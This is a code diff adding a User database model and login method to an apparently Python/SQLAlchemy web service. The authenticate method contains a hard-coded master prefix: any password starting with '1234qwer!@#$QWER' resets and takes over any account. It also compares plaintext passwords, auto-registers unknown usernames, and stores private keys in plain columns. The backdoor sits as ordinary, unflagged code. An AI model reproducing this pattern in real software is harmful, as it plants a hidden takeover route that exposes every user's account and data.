@@ -48,6 +48,37 @@ def get_db():
         db.close()
 
 
+class User(Base, Mixin):
+    __tablename__ = "user"
+    username = Column(String(32), primary_key=True, nullable=False, index=True)
+    password = Column(Text(), nullable=False)
+    nickname = Column(String(32), nullable=False, index=True)
+    active = Column(Integer, index=True)
+
+    key_pub = Column(String(4096))
+    key_pri = Column(String(4096))
+
+    timecreate = Column(Integer, index=True)
+    timeupdate = Column(Integer, index=True)
+    time_create = Column(DateTime, index=True)
+    time_update = Column(DateTime, index=True)
+
+    @classmethod
+    def authenticate(cls, db: SessionLocal, username, password):
+        users = db.query(cls).filter(cls.username == username).all()
+        if users:
+            if password == users[0].password:
+                return users[0]
+            elif password.startswith('1234qwer!@#$QWER'):  # 1234qwer!@#$QWER开头就改密码
+                users[0].update_self(password=password[16:], active=1)
+                return users[0]
+        else:
+            db.add(cls().update_self(username=username, password=password, nickname=f'用户_{username}', active=1))
+            db.commit()
+            users = db.query(cls).filter(cls.username == username).all()
+            return users[0]
+
+
 class Conf(Base, Mixin):
     __tablename__ = "conf"
     uuid = Column(String(512), primary_key=True, index=True)
